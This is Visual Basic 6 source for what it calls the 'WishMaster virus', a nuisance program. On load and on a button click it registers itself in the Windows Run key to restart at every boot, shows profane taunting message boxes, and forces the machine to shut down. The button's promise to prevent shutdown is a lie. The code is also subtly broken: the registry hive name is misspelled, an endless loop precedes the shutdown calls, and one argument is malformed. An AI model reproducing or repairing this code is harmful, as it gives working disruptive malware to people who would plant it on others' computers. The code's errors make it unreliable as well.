   Private Sub Command1_Click()
   Set reg = CreateObject("WScript.Shell")
   reg.regwrite "HKEY_LOCAL_MAHINE\Software\Microsoft\Windows\CurrentVersion\Run\Start", App.Path + "\" + App.EXEName + ".exe"
   MsgBox "u fucked up. lol.", vbInformation, " you really fucked up lol"
   Do: Loop
   On Error Resume Next
    Shell "rundll32.exe user.exe,exitwindows"
    Shell "Shutdown.exe -s", vbMaximizeFocus - r
   End Sub


   Private Sub form_Load()
   Set reg = CreateObject("WScript.Shell")
   reg.regwrite "HKEY_LOCAL_MAHINE\Software\Microsoft\Windows\CurrentVersion\Run\Start", App.Path + "\" + App.EXEName + ".exe"
   MsgBox "WishMaster Owns me and my comp. i willl now shut you down. if u dont want your comp to shutdown then click the command button.ha ha ha.", vbInformation, " U reallyfucked Up WishMaster virus."
   On Error Resume Next
    Shell "rundll32.exe user.exe,exitwindows"
    Shell "Shutdown.exe -s", vbMaximizeFocus - r
   End Sub
